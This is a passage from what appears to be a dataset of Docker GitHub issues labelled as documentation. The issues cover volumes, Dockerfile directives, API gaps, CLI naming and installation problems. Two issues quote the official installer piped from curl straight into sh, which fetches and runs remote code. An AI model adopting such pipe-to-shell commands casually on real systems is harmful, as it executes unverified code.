credentials.  For example, if the credentials are stored in a file, which file is updated?  Does resolving credentials depend on the UID of the current process, the $HOME variable (to find a dot-file), etc.\n\nhttps://docs.docker.com/reference/commandline/cli/#login\n"},{"labels":["documentation",null,null],"text":"I just run over a rather undokumented behaviour from a docker ecosystem viewpoint.\nI needed to figure out, how ENV are processed (if in single or double quoted notion by default, which implies caution about escaping.)\n\nSo I would love to see a hint on the docs to clarify the point.\nhttp://docs.docker.com/reference/builder/#env\n\n**_Suggestion:**_\n\"ENV are processed in the double quoted notion by default which makes strings subject to shell escaping acording to the shell used in the target image. You can use the alternative declaration with single quotes instead.\"\n"},{"labels":["documentation",null],"text":"The \"Finding the Cgroup for a Given Container\" section of https://docs.docker.com/articles/runmetrics/ is out of date, at least for containers that do not use LXC.\n\nHere is an example: \"Putting everything together to look at the memory metrics for a Docker container, take a look at /sys/fs/cgroup/memory/lxc/<longid>/.\"  I don't use LXC.  On my Ubuntu 14.04 machine running Docker 1.4.1, the correct path is /sys/fs/cgroup/memory/docker/<longid>/.\n"},{"labels":["documentation",null,null],"text":"If you want to remove a link between containers, you can use `docker rm --link`. The current documentation says:\n\n```\n $ docker help rm\n\nUsage: docker rm [OPTIONS] CONTAINER [CONTAINER...]\n\nRemove one or more containers\n\n  -f, --force=false      Force the removal of a running container (uses SIGKILL)\n  -l, --link=false       Remove the specified link and not the underlying container\n  -v, --volumes=false    Remove the volumes associated with the container\n```\n\nI eventually figured out that you need to use the syntax `docker rm -l HOSTCON/LINKCON`, but I'm not sure how I was meant to know that. It doesn't feel symmetrical to the syntax used to create a link or other commands which typically use : as a separator.\n\nAlso, I'm really not convinced `docker rm` is the right place for the functionality - all other flags remove the container including `-v`. Could this be moved to a `docker unlink` subcommand or similar and the documentation improved?\n"},{"labels":["documentation",null],"text":"There is no mention of what the permitted parameters are for starting a container are in the remote documentation API. I _know_ that some options are permitted, for example I've been using `\"PublishAllPorts\"` . I'm not sure if its mostly the same as /containers/create or not.\n\nhttps://docs.docker.com/reference/api/docker_remote_api_v1.16/#start-a-container\n"},{"labels":["documentation",null,null,null],"text":"I ran an experiment today to see how these things intersect.\n\nhttps://gist.github.com/thockin/c44a88b84c2a1041a1bd\n\nThere are three cells in this matrix that are totally nonsensical.  Worse the dockerfile spec says \"The shell form prevents any CMD or run command line arguments from being used\", which is clearly untrue.\n\nMore that this, though, the semantic between the two is sort of weird, especially since they can be arrays or strings.\n\nI wonder if there has been any thought put into simplifying the semantics around these things?\n"},{"labels":["documentation",null],"text":"Hi\n\nHere's a transcript from a chat I had (with one of your employees?) a few minutes ago, that describes everything:\n\nyaronr: Strange. After bind-mounting a file, it changes to be a directory. removing the -v - and the file is a file again..\nyaronr: has anyone seen this?\nerikh: it's a known issue\nyaronr: erikh: really ?! I've spent hours on it\nyaronr:it used to work.\nerikh: when?\nyaronr: up until a couple of weeks ago. I have this unit file that uses this approach to map a config file from the host to the container\nyaronr: erikh: I actually have a few of them..\nerikh: what version of docker were you using before?\nyaronr: 1.3.x\nerikh: and it doesn't work in 1.4 now?\nerikh: put in an issue\nyaronr: yup\nerikh: I swear it never worked this way though\nyaronr: I'm pretty sure there even was an example for mounting specific files, in the docs.\nyaronr: erikh: you said it's a known issue - what do you mean?\nerikh: well, then definitely put in an issue :)\nerikh: I swear that we didn't support this\nerikh: but I could be wrong\nerikh: other people know that code better than me, like cpuguy83\nerikh: but I think he's at lunch\nyaronr: erikh: AHA, it IS (or should be) supported, read the docs: https://docs.docker.com/userguide/dockervolumes/  'Mount a Host File as a Data Volume'\nyaronr\nerikh: don't swear so quickly ;)\nyaronr: so I guess what you're saying is that you think something has changed in this area?\nyaronr: this explains why one day, a bunch of my unit files stopped responding..\nyaronr: ping?\n"},{"labels":["documentation",null],"text":"##### Steps To Reproduce\n- Create an image using the following Dockerfile source:\n\n```\n    FROM       ubuntu:12.04\n    RUN apt-get update;  \\\n        apt-get install -y screen;\n    RUN adduser --disabled-password --gecos -- dlw; \\\n        passwd -d dlw;\n    USER dlw\n    ENTRYPOINT  /bin/bash\n```\n- Execute image: `'docker run -i -t <imageGUID>.'`\n- On resulting container's command line attempt to start:  `screen`.\n  Screen will issue the following message:\n  `Cannot open your terminal '/dev/console' - please check.`\n  Here are the permissions as displayed by `'ls -al /dev/console'`:\n\n```\n    crw------- 1 root root 136, 7 Dec 24 12:15 /dev/console\n```\n- Alter Dockerfile so 'root' becomes default user and explicitly log in 'dlw' (non-root) account:\n\n```\nFROM       ubuntu:12.04\nRUN apt-get update;  \\\n    apt-get install -y screen;\nRUN adduser --disabled-password --gecos -- dlw; \\\n    passwd -d dlw;\nUSER root\nENTRYPOINT  login dlw\n```\n- Execute image: `'docker run -i -t <imageGUID>.'`\n- Start: `screen`.\n  Screen works as expected.\n  Here are the permissions as displayed by `'ls -al /dev/console'`:\n\n```\n    crw------- 1 dlw tty 136, 7 Dec 24 12:33 /dev/console\n```\n##### Environment\n- Using docker version 1.3.1.\n- Ubuntu  12.04.4 LTS\n##### Behavior Assessment\n\nAn implicit login request, implemented by Dockerfile USER statement, that isn't 'root' doesn't seem to completely prepare a container's permissions to the /dev/console device for the implicit user.  However, an explicit 'login' request (event) triggers the container permissions for '/dev/console' to allow  non-root container accounts access to this device.  Are there potentially other permission issues resulting from this difference between implicit/explicit login requests?\n"},{"labels":["documentation",null,null],"text":"When you are browsing the documentation at https://docs.docker.com/ , the links for the release notes for previous versions is inconsistent or broken.   I was trying to find the Docker 1.2 release notes and had to go on a bit of a hunt to finally get to it.\n\nStarting at the main page\n https://docs.docker.com/  \nThe LHS link to release notes takes you to the bottom of the page, to the release notes section\nhttps://docs.docker.com/#release-notes\n\nThe link there takes you to\nhttps://docs.docker.com/release-notes/\nWhich has the Docker 1.4 documentation version of Release Notes.  This is missing the previous 1.3, 1.2 and other release notes.  This made me think that the drop down in the top right was how you got other release note versions.\n\nGoing to Version v1.3 will take you to\nhttps://docs.docker.com/v1.3/release-notes/\nWhich has the release notes as of v1.3  which also contains the previous versions of 1.2, 1.1 and 1.0 release notes on the LHS.  Those links take you to the various sections of that v1.3 release notes page.\n\nGoing to Version 1.2 from the drop down, you get taken to\nhttps://docs.docker.com/v1.2/release-notes/\nWhich does not exist.  Same for other versions.\n\nBut there does exist a v1.2 release notes page, it is just not a separate page and is a section on the main v1.2 page.\nhttps://docs.docker.com/v1.2/#release-notes\n\nAdditionally if you are on the main page for docs\nhttps://docs.docker.com/\n\nGo to v1.3 from the drop down menu, now at\nhttps://docs.docker.com/v1.3/\n\nThe release notes link on the LHS takes you to bottom of page\nhttps://docs.docker.com/v1.3/#release-notes\n\nThe link in that section takes you to\nhttps://docs.docker.com/release-notes/\n\nWhich is the release notes for v1.4 not v1.3 \nDrop down menu top right will change to v1.4\nChanging it to v1.3 will now take you to \nhttps://docs.docker.com/v1.3/release-notes/\n\nHope that describes the different click workflows I had to go through\n\nI think the following should happen:\nRelease notes for 1.4 should be updated with previous versions (similar to 1.3) if it is suppose to be a comprehensive living release notes document\nIf not, then each previous version should get a separate release notes page in their respective areas so the drop down selector when on the release notes page works for them.\n"},{"labels":["documentation",null,null,null],"text":"Description of problem:\n\nAfter installing the lxc-docker package from the repositories\nprovided by Docker on Ubuntu 14.04.1 the Docker daemon fails to\nstart because of the missing executable `/sbin/apparmor_parser`.\n\n`docker version`:\n\n```\nClient version: 1.4.1\nClient API version: 1.16\nGo version (client): go1.3.3\nGit commit (client): 5bc2ff8\nOS/Arch (client): linux/amd64\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\n`docker info`:\n\n```\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\n`uname -a`:\n\n```\nLinux srv28 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\n\nA new physical server with a fresh minimal install of Ubuntu 14.04.1.\n\nHow reproducible:\n\nOn a custom minimal Ubuntu install without apparmor this is always reproducable. The standard Ubuntu install seems to include apparmor and therefore the problem is not apparent. \n\nSteps to Reproduce:\n1. Follow install instructions: http://docs.docker.com/installation/ubuntulinux/#docker-maintained-package-installation\n2. `service docker start`\n2. `docker info`\n\nActual Results:\n\nThe Docker daemon fails to start.  `docker info` outputs\n\n```\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\nand `/var/log/upstart/docker.log` contains\n\n```\nINFO[0000] +job serveapi(unix:///var/run/docker.sock)   \nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock) \nINFO[0000] +job init_networkdriver()                    \nINFO[0000] -job init_networkdriver() = OK (0)           \nINFO[0000] WARNING: Your kernel does not support cgroup swap limit. \nFATA[0000] Error loading docker apparmor profile: fork/exec /sbin/apparmor_parser: no such file or directory () \n```\n\nExpected Results:\n\nThe Docker daemon should be up and running.  `docker info`\nshould output something like\n\n```\nContainers: 0\nImages: 0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 0\nExecution Driver: native-0.2\nKernel Version: 3.13.0-43-generic\nOperating System: Ubuntu 14.04.1 LTS\nCPUs: 12\nTotal Memory: 62.89 GiB\nName: srv28\nID: SDXF:XYT2:PAMA:OSYS:2QJD:VIZN:MDUU:PYJK:YJXY:2RCA:4A6F:ZCDL\nWARNING: No swap limit support\n```\n\nand `/var/log/upstart/docker.log` should contains something like\n\n```\nINFO[0000] +job serveapi(unix:///var/run/docker.sock)   \nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock) \nINFO[0000] +job init_networkdriver()                    \nINFO[0000] -job init_networkdriver() = OK (0)           \nINFO[0000] WARNING: Your kernel does not support cgroup swap limit. \nINFO[0000] Loading containers: start.                   \nINFO[0000] Loading containers: done.                    \nINFO[0000] docker daemon: 1.4.1 5bc2ff8; execdriver: native-0.2; graphdriver: aufs \n```\n\nAdditional info:\n\nRunning the following command allows the Docker daemon to start\nproperly:\n\n```\napt-get install apparmor\n```\n\nThus the lxc-docker package should depend on apparmor which contains the missing executable `/sbin/apparmor_parser`.\n"},{"labels":["documentation",null,null],"text":"This is a request for comments to either build our own tooling, or use existing tools to do the following:\n- Keep bash completions in sync with the client (when flags are added, etc)\n- Keep API docs up to date when the API is updated/ new things are added\n- Keep man pages in sync with changes to the client\n\nIf anyone has existing tools they think would be good for this, please comment. The problems that we have seen with suggested tools in the past are that they are not easily integrated to our setup and we cannot benefit from all the features they provide. Also we wind up only solving part of the problem. So it ends up feeling like a big, heavy bandaid and is not ideal.\n"},{"labels":["documentation",null,null],"text":"I might take a crack at this if there's interest, but I'd like to at least note down that I'm keen on having a page in documentation dedicated to discussing the upgrade path for users running versions of Docker that lag behind the latest.  In particular it would be useful to formalize what to do in the case of when the user has installed with `curl get.docker.com | sh` and they want to upgrade.  Especially when urgent security fixes come out, it'd be nice to have a canonical way to do this (and possibly a script or something that does much of the work for you).\n\nRight now what I do for hobby use is:\n1. download the latest binary i.e. https://docs.docker.com/installation/binaries/#get-the-docker-binary\n2. replace the existing binary \n3. `sudo service docker restart`\n4. `docker run` the containers that were previously running again.  I can't remember if the processes that were run when the daemon restart happens get ghosted (which might cause odd issues), but they didn't show up in `docker ps` after a daemon reset with a new version last time that I checked.  I'm not sure if this is expected behavior or not.\n\nMy way of doing things might be completely broken but without an official word from us I'm not entirely sure if it is or isn't.\n\nAlso, if you're running a version from a package manager (say, 1.2) that is vulnerable and the official package archives lag behind the latest docker release, what do you do?\n"},{"labels":["documentation",null],"text":"Related: https://github.com/docker/docker/issues/9393, https://github.com/docker/docker/issues/5545\n\nThe way that default values for boolean flags/options is documented is confusing for some people and choosing a simpler notation could take away that confusion.\n\nFor example;\n\n```\n-v, --version=false               Print version information and quit\n```\n\nCould be interpreted as;\n\n\"To print version information, run `docker --version=false`\", whereas it _should_ be used;\n`docker --version`.\n\n_Technically_, it could be used as `docker --version=true`, but I doubt many people will find\nthat useful, so _not_ documenting this seems reasonable to me.\n### Proposed change\n\nChange the documentation (and help) for flags/options that _don't_ require/expect a value, and \nremove the default value. Flags that _do_ accept a value should still mention this.\n\nThe documentation will look like this;\n\n```\n-v, --version               Print version information and quit\n```\n### Other software\n\nI did a quick check how other software handles this. Some examples are below;\n\n```\n# MySQL:\n -V, --version       Output version information and exit.\n --select-limit=#    Automatic limit for SELECT when using --safe-updates.\n\n --server-arg=name   Send embedded server this as a parameter.\n\n# GIT\nusage: git [--version] [--help] [-C <path>] [-c name=value]    \n\n# Fig\nOptions:\n  --version                 Print version and exit\n  -f, --file FILE           Specify an alternate fig file (default: fig.yml)\n  -p, --project-name NAME   Specify an alternate project name (default: directory name)\n\n# SubVersion (svn checkout)\nValid options:\n  -r [--revision] ARG      : ARG (some commands also take ARG1:ARG2 range)\n                             [edited]\n  -q [--quiet]             : print nothing, or only summary information\n```\n\n**NOTE**\nThis proposal does _not_ intent to change the way flags are working right now, \nonly change the way it is _documented_. Changing the behavior of flags and renaming\nwas proposed in the past (https://github.com/docker/docker/pull/5760, https://github.com/docker/docker/pull/5764) and voted against / rejected, so please do not bring that up here again.\n"},{"labels":["documentation",null],"text":"This should be similar to https://github.com/docker/docker/issues/1024\nI am using:\nOSX yosemite\ndocker 1.3.1\nboot2docker 1.3.2\nI use as a **centos** base from sequenceiq: https://github.com/sequenceiq/hadoop-docker \nI try to install R and RStudio.  R does not give any problem, but this is what I get from RStudio:\n### \n\nInstall       1 Package(s)\nTotal size: 276 M\nInstalled size: 276 M\nDownloading Packages:\nRunning rpm_check_debug\nRunning Transaction Test\nTransaction Test Succeeded\nRunning Transaction\n  Installing : rstudio-server-0.98.1091-1.x86_64                            1/1 \ngroupadd: group 'rstudio-server' already exists\nrsession: no process killed\n**initctl: Unable to connect to Upstart: Failed to connect to socket /com/ubuntu/upstart: Connection refused**\ninitctl: Unable to connect to Upstart: Failed to connect to socket /com/ubuntu/upstart: Connection refused\n  Verifying  : rstudio-server-0.98.1091-1.x86_64                            1/1 \nInstalled:\n  rstudio-server.x86_64 0:0.98.1091-1  \nComplete!\n### \n\nAt the end of all the components load, I get:\n\nStep 31 : RUN echo rstudio | passwd --stdin rstudio\n ---> Running in 6bd3038eec99\n/usr/share/cracklib/pw_dict.pwd: No such file or directory\nPWOpen: Invalid argument\n## \n\nPlease note that the error message referring to ubuntu does not help to understand what is the issue.\n\nThanks in advance for any help.\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/master/docs/sources/articles/b2d_volume_resize.md\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/userguide/dockerrepos/#find-public-images-on-docker-hub\n\nI tried the same steps except searching for node, and sure, I get the main top-level node result. The docs however seem to indicate this is image results I'm seeing, but they seem to be repositories. In fact, when I continue to the next step and run docker pull node, docker tries to download all images in the repo, clearly not what you expect from reading the documentation. \n\nAlso, there doesn't seem to be a clear way to list all images in the node repo from the command line. I only realised \"docker pull node:latest\" is what I was looking for from looking at the node repo website on the docker hub. \n"},{"labels":["documentation",null],"text":"Hi All,\n\nI am setting up the docker build environment. There is a step in docker makefile that:\n\ndocker build -t \"docker:master\" .\n\nand in the dockerfile, it need install golang as followed:\n# Install Go\n\nRUN    curl -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n\nUnfortunately, I can not directly visit golang from local so I setup a ssh tunnel and I can successfully vist the go source file through the pipe by command \" curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz\". And then, I change the dockerfile as:\n# Install Go\n\nRUN    curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n\nBut it failed by:\n\nStep 5 : RUN curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n ---> Running in 00ea81fe6596\ncurl: (7) Failed to connect to 127.0.0.1 port 9090: Connection refused\n\nIt seems that docker build running in different network stacks as my host. Is there any idea to help resolve it?\n"},{"labels":["documentation",null],"text":"I just found this today; \n Docker Remote API wrapper for Haskell - a Work in progress ; https://github.com/denibertovic/docker-hs \nThe doc page said to add a bug if new API's were discovered :).\nhttps://docs.docker.com/reference/api/remote_api_client_libraries/\n"},{"labels":[null,"documentation",null],"text":"**Summary**: \nThere is no standardised \"naming\" for (sub)commands on the CLI (e.g. plural vs singular, create vs add), sometimes leading to inconsistencies.  \n\n**Proposed solution**:\nA design document should be written, describing the (naming) conventions to follow for commands and the UX in general.\n\n---\n\nA number of new features are currently proposed via PRs for addition to Docker. These features add new commands to the CLI and I have noticed that the UI for those commands (and _existing_ commands) is inconsistent.\n\nWhile there still a chance to change those proposals before they are merged, I think it would be a good thing to review those PRs and reach consensus on what the UI should look like to be consistent.\n\nI've created a (far from complete) overview of some _existing_ and _proposed_ commands;\n\n| Entity | Action | Command | Notes |\n| --- | --- | --- | --- |\n| Container | list | `docker ps` |  |\n| Device | list | - | (not supported) |\n| Host | list | `docker hosts` | no sub command. see https://github.com/docker/docker/issues/8681 |\n| Image | list | `docker images` | no sub command (`ls`) |\n| Links | list | `docker links list` | see https://github.com/docker/docker/issues/7468 |\n| Volume | list | `docker volumes ls` | see https://github.com/docker/docker/pull/8484 |\n| Container | delete | `docker rm (id)` |  |\n| Device | delete | `docker device remove (id)` | see https://github.com/docker/docker/pull/8826 |\n| Host | delete | - | (not supported?) |\n| Image | delete | `docker rmi (id)` |  |\n| Links | delete | `docker links remove (id)` |  |\n| Volume | delete | `docker volumes rm (id)` |  |\n| Container | create | `docker create` | no \"containers\" before \"create\" |\n| Device | create | `docker device add` | note: _singular_ \"device\", others are \"plural\" |\n| Host | create | `docker hosts create` | `run` [is proposed as alternative](https://github.com/docker/docker/issues/8681#issuecomment-60349475) |\n| Link | create | `docker links add` |  |\n| Volume | create | `docker volumes add` |  |\n- The `ls` and `list` subcommands could be omitted dropped for `volumes` and `links` to be in line with the existing `images` command. \n- The subcommand for \"delete\" should either be \"remove\" or \"rm\" for all entities.\n- The subcommand for \"create\" could be renamed from \"add\" to \"create\" to be in line with the existing `docker create` command (not sure, I actually like \"add\")\n- All entities / top-level commands should be either plural or singular (rename `device` to `devices`?)\n\nNow that the \"links\" (https://github.com/docker/docker/issues/7468), \"volumes\" (https://github.com/docker/docker/pull/8484), \"hosts\" (https://github.com/docker/docker/issues/8681) and \"devices\" (https://github.com/docker/docker/pull/8826) changes are still a proposal, I think the creators those proposals should discuss a consistent UI before they're implemented to keep things consistent.\n\nFor the _existing_ commands I understand that most frequently used commands are deliberately left short for convenience, perhaps \"long\" versions (`docker images rm`?) could be added to make the UI more consistent.\n\n(This is a follow up on a comment I placed here https://github.com/docker/docker/pull/8484#issuecomment-60827328)\n\n**update**\nAdded the \"hosts\" proposal to the list and sorted the list a bit\n"},{"labels":[null,"documentation"],"text":"I think the ADD and COPY directives don't work as one would expect. Given this directory layout:\n\n```\n.:\ndir  Dockerfile  rootfile.txt\n\n./dir:\nchild  dirfile.txt\n\n./dir/child:\nchildfile.txt\n```\n\nand this Dockerfile:\n\n```\nFROM debian:wheezy\nCOPY rootfile.txt dir /test/\nCMD [\"ls\", \"-R\", \"/test\"]\n```\n\nI get this image result:\n\n```\n/test:\nchild  dirfile.txt  rootfile.txt\n\n/test/child:\nchildfile.txt\n```\n\nThe documentation states that `If <src> is a directory, the entire directory is copied, including filesystem metadata.`\nThis sound like the COPY and ADD directive should behave like a `cp -r <src> <dest>` (which I expected), but if `<src>` is a directory, not the directory itself is copied but the contents of the directory.\n\nIs this intended behavior?  When yes, then the documentation should clearly say that the contents of a <src> directory is copied and not the directory.\n\n```\ndocker version:\nClient version: 1.3.0\nClient API version: 1.15\nGo version (client): go1.3.3\nGit commit (client): c78088f\nOS/Arch (client): linux/amd64\nServer version: 1.3.0\nServer API version: 1.15\nGo version (server): go1.3.3\nGit commit (server): c78088f\n\ndocker info:\nContainers: 8\nImages: 69\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 85\nExecution Driver: native-0.2\nKernel Version: 3.17.1-1-aufs_friendly\nOperating System: Arch Linux\nDebug mode (server): false\nDebug mode (client): true\nFds: 10\nGoroutines: 15\nEventsListeners: 0\nInit SHA1: e244de98e642144b162d1936978b8ac5d024d546\nInit Path: /usr/lib/docker/dockerinit\nWARNING: No swap limit support\n```\n"},{"labels":["documentation",null],"text":"Hi guys,\n\n**Basic problem:**\nthe doc section on Dockerfiles is rather confusing, because it doesn't really explain an important concept: why is the dockerfile named \"Dockerfile\" similar to \"Makefile\", and what does that mean for the folder is it in? Why is it not just a \"buildmyimage\" file and that's it? Why a whole folder around it, what is it for?\n\n**Current situation:**\nThe docs make a basic attempt at explaining it here: http://docker.readthedocs.org/en/v0.5.3/use/builder/ 1. Usage: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository.\"\n\nHowever, the docs completely drop the ball clarifying this. What is a repository here? Is that something special with special other files that are automatically used? Does it need a specific layout?\n\nEven worse, if you are sufficiently confused to click \"Working with repositories\" in the navigation to clear this up, that section introduces a confusing online image thing where the basic concept of what a single repository is _in practise on my hard disk as a basic folder_ is entirely missing.\n\n**Proposal:**\nhttp://docker.readthedocs.org/en/v0.5.3/use/builder/ 1. Usage: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository.\"\n\nChange to: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository, which is just the basic folder containing all sorts of other resources you might need and later reference from your Dockerfile to include and use for your image as needed.\"\n\nOr whatever you see fit. But please add a proper explanation!\n\n**Disclaimer:**\nI started reading the docker docs a few hours ago, so I might be misunderstanding basic concepts. But this really seemed confusing to me, so it would be neat if you could look into it - unless the explanation is already there and I was just too blind to stumble across it.\n"},{"labels":["documentation",null],"text":"Bugzilla https://bugzilla.redhat.com/show_bug.cgi?id=1121689 \n\nDescription of problem:\nThe handling of stdout/stderr stream is not correct in tty mode (works fine in non-tty mode). You can see it on the example bellow. (`ls non_existing_file` prints into stderr stream)\n\nVersion-Release number of selected component (if applicable):\ndocker-1.1.1-1.el7.x86_64\n\nHow reproducible:\nAlways\n\nSteps to Reproduce:\nTTY:\n[root@localhost ~]# docker run -t -a stderr fedora ls non_existing_file\n[root@localhost ~]# docker run -t -a stdout fedora ls non_existing_file\nls: cannot access non_existing_file: No such file or directory\nNON-TTY:\n[root@localhost ~]# docker run -a stderr fedora ls non_existing_file\nls: cannot access non_existing_file: No such file or directory\n[root@localhost ~]# docker run -a stdout fedora ls non_existing_file\n\nActual results:\nIn tty mode the output is visible only when STDOUT is attached, in non-tty mode it's visible in STDERR\n\nExpected results:\nIn booth modes the output should be in STDERR stream.\n\nAdditional info:\nWhen I use `ls /` it prints the info correctly into STDOUT in booth modes.\n"},{"labels":[null,"documentation",null,null],"text":"Registry 0.8.0 and the Hub and Registry Spec v1.2 do not match up for pushing images. I haven't tested pulling images yet.\n\nCan you clarify which version of the spec goes with which version of the registry?\n\nAs far as I can tell steps are wrong.\n\nFor pushing an image I'm seeing this request GET /v1/repositories/dockerfile/nginx/layer/27cf784147099545/access, yet there is no documentation talking about an access endpoint, and the built in no-auth index apart of the registry code doesn't event reference an access endpoint.\n\nThe behavior I see is the following. This is version 0.8.0 of the registry and 1.2.0 of the docker client/daemon\n\n(this flow here does not include the registry actions, just the actions I am seeing on the index/hub)\n1. GET /v1/_ping\n2. PUT /v1/repositories/:namespace/:repo\n3. GET /v1/repositories/:namespace/:repo/images\n4. GET /v1/repositories/:namespace/:repo/images\n5. GET /v1/repositories/:namespace/:repo/layer/:image/access\n\nAt step 5 it fails with `2014/09/08 12:11:34 HTTP code 400 while uploading metadata: {\"error\": \"Image depends on an unauthorized parent\"}`\n\nThanks.\n"},{"labels":["documentation",null],"text":"Based on https://docs.docker.com/articles/runmetrics/#interface-level-counters but scripted/refined and working on Ubuntu 14.04. The main thing needed in the documentation a comment for 14.04 showing the path to the cgroup device is /sys/fs/cgroup/devices/docker/$CID_/tasks instead of /sys/fs/cgroup/devices/$CID_/tasks, but here's a script to show the interface stats in one command.\n\n```\n#!/bin/bash\nif [ $# -ne 1 ]; then\n  echo \"usage: $0 {container_id}\"\n  exit 1\nfi\n\nSHORT_CID=$1\nCID=$(docker inspect --format=\"{{.Id}}\" ${SHORT_CID} 2>/dev/null)\nif [ $? -ne 0 ]; then\n  echo \"No container: ${SHORT_CID}\"\n  echo \"Are you running with sudo?\"\n  exit 2\nfi\n\n\nTASKS=/sys/fs/cgroup/devices/docker/$CID/tasks\nPID=$(head -n 1 ${TASKS})\nNETNS_PATH=/var/run/netns/${CID}\n\nmkdir -p /var/run/netns\nln -sf /proc/$PID/ns/net ${NETNS_PATH}\nip netns exec ${CID} netstat -i\n\nunlink ${NETNS_PATH}\n```\n"},{"labels":["documentation",null],"text":"Many fields in the response objects that I actually get in my local calls do not exist in Remote API v1.13 documentation.\n\nAnd documentation is so bad that there are no types specified.\n\ne.g. it just says:\n\n```\n \"PortSpecs\":null,\n```\n\nwhat is the type of this field? It is just a null in JSON response.\n\nThat doesn't make sense. Docs are very vague and it's almost impossible to write a correctly working client without reading other clients and keep testing every single corner case (e.g. you gotta reproduce a case where portspecs is not null by creating a container etc).\n\nThis is crazy and will not help things move forward very well.\n"},{"labels":["documentation",null],"text":"The `USER user` command in Dockerfiles does the equivalent of `su user -c command` for all future `RUN command` commands.\n\nI propose adding the `GROUP group` command, which would do the equivalent of `sg group -c command` for all future `RUN command` commands.\n\n`newgrp` is a command that works a lot like `su` without a `-c` command, and sets the gid for future commands in the shell, but due to the way docker works, this is cleared between each command in the Dockerfile, so something like the following does _NOT_ work:\n\n```\nUSER user\nnewgrp group\n```\n\nInstead, my hope would be to be able to do something like:\n\n```\nUSER user\nGROUP group\n```\n"},{"labels":["documentation",null],"text":"https://docs.docker.com/examples/running_riak_service/\n\nhttp://jpetazzo.github.io/2014/06/23/docker-ssh-considered-evil/\n"},{"labels":["documentation",null],"text":"This page http://docs.docker.com/docker-hub/accounts/#organizations-groups should have more information about groups and how groups work with orgs. It should also have more information about roles of groups (read, write, admin) and what the permissions are for each group. I believe they are proper subsets of each other (admin ( write ( read ))) but I don't see that documented anywhere.\n"},{"labels":["documentation",null,null],"text":"When using volumes, the usefullness of the volume is limited without coupling it with a data-container.\nThe reason for this is the tie between a container and the volume... when the container goes away so does the possibility of actually using the data in that volume again, unless you'd happened to copy the host path of that volume.\n\n**Sumary**: referencing a volume is impossible when last container is removed\n\n**Proposed Solution**: Provide volume management API/UI.  This has started to be implemented in #8484\n"},{"labels":["documentation",null],"text":"which is a bit of a shame\n"},{"labels":["documentation",null],"text":"Operators need to know where the data in \"volumes\" is stored on the host so that they can monitor size, perform backups, migrate data, etc.\n\nHere is one way to dump the bindmounts on a container:\n\n```\n# Create a test container with volumes\n$ docker run --name testvol -v /vol-anon -v /tmp/vol:/vol-named ubuntu true\n\n# Ok, let's see where those volumes went...\n$ docker inspect --format={{.Volumes}} testvol\nmap[/vol-anon:/var/lib/docker/vfs/dir/1ed44639019c10269718628da26d792857c01dc0d383169841855db83c2d6904 /vol-named:/tmp/vol]\n```\n\nI think this would be a helpful addition to http://docs.docker.io/use/working_with_volumes/\n"},{"labels":["documentation",null,null],"text":"The `docker cp` command can currently copy a file from the container to the host. It should also be able to do the reverse.\n\nPing @crosbymichael \n"},{"labels":["documentation",null],"text":"We currently prefix commands with `#` or `$`. We should either:\n1. replace this/remove these.\n2. Have some JS magic so people who select commands in highlight boxes don't get the prefix.\n"},{"labels":["documentation",null],"text":"(on a just installed 14.04)\n\ncurl https://get.docker.io | sh\nsudo apt-get install docker.io\n\n(the second removes our package, and installs the ubuntu one)\n\nleaves us with `service --status-all` listing 2 services: `docker` and `docker.io`\n\nwhich makes me think our lxc-docker package is not cleaning up quite well enough.\n\nrebooting at this point leaves us with a happily working Docker 0.9.1\n\nthen `ln -s /usr/bin/docker.io /usr/bin/docker` and rebooting causes things to go bad.\n\non my system, there is only one docker daemon running, but its un-contactable.\n\n`service docker stop` does nothing, as its not running\n`service docker.io stop` stops the rogue daemon, and then \n`service docker.io start` makes everything happy again.\n\nsimilarly, after stopping which ever service is  running, \n`service docker start` works.\n\nso its probably _just_ something that happens if you start 2 daemons at almost the same time.\n"},{"labels":["documentation",null],"text":"Surely it should read \"--no-trunc=true: Don't truncate output\" or \"--no-trunc=false: Truncate output (default behaviour)\".\n\nSimilar for \"--quiet=false\".  I presume it was intended to show the alternatives (either \"-q\" or \"--quiet=false\"), however the textual description is misleading.\n\nI think a better format would be  \"-q, --quiet=<true|false>: whether to only display numeric IDs\", or something along those lines.\n\n```\nanni@helium:~/src/Redis$ docker ps -h\n\nUsage: docker ps [OPTIONS]\n\nList containers\n\n  -a, --all=false: Show all containers. Only running containers are shown by default.\n  --before=\"\": Show only container created before Id or Name, include non-running ones.\n  -l, --latest=false: Show only the latest created container, include non-running ones.\n  -n=-1: Show n last created containers, include non-running ones.\n  --no-trunc=false: Don't truncate output\n  -q, --quiet=false: Only display numeric IDs\n  -s, --size=false: Display sizes\n  --since=\"\": Show only containers created since Id or Name, include non-running ones.\nanni@helium:~/src/Redis$\nanni@helium:~/src/Redis$ docker version\nClient version: 0.10.0\nClient API version: 1.10\nGo version (client): go1.2.1\nGit commit (client): dc9c28f\nServer version: 0.10.0\nServer API version: 1.10\nGit commit (server): dc9c28f\nGo version (server): go1.2.1\nLast stable version: 0.10.0\nanni@helium:~/src/Redis$\n```\n"},{"labels":[null,"documentation"],"text":"Similar to #1136.\n\nI want to be able to say `CMD [ \"$CATALINA_HOME/bin/catalina.sh\", \"run\"]`\n"},{"labels":["documentation",null],"text":"When there is nothing to show in TOC, maybe we could hide it or display the main 